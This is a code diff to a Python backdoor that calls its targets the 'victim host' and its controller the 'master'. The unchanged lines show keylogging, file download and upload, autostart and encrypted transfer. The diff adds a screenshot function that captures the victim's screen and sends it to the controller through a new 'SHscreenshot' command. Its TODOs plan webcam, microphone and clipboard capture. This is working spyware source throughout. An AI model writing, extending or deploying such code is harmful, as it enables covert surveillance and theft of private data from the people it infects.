@@ -15,10 +15,10 @@ import time
 from base64 import b64encode, b64decode
 from filecmp import cmp
 from pathlib import Path
-
+import pyscreenshot as ImageGrab
+from io import BytesIO
 # pycryptodome
 from Crypto.Cipher import AES
-# tendo
 from tendo import singleton
 
 # Importing module for autostart written by Jonas Wagner
@@ -249,6 +249,16 @@ def keylogs_download():
         print(exception)
 
 
+# TODO: Test on Windows
+def screenshot():
+    buffer = BytesIO()
+    im = ImageGrab.grab()
+    im.save(buffer, format='PNG')
+    im.close()
+    b64_str = str(b64encode(buffer.getvalue()))
+    sender(b64_str[2:-1])
+
+
 def downloader():
     """Download a file from victim host to master.\n"""
     sender('Insert name of the file\t\t' + os.path.normcase('C:/boot.ini') + '\n')
@@ -476,6 +486,8 @@ def backdoor():
                         downloader()
                     elif received_command == 'SHupload':
                         uploader()
+                    elif received_command == 'SHscreenshot':
+                        screenshot()
                     elif received_command == 'SHkeylogstatus':
                         keylogs_status()
                     elif received_command == 'SHkeylogstart':
@@ -529,5 +541,4 @@ thread2 = threading.Thread(name='sic2', target=backdoor).start()
 # TODO: Split source in modules
 # TODO: Keylogger add clipboard (trigger on ctrl+c and ctrl+v)
 # TODO: Add active window recognition
-# TODO: Add screenshooter
 # TODO: Add Webcam and microphone
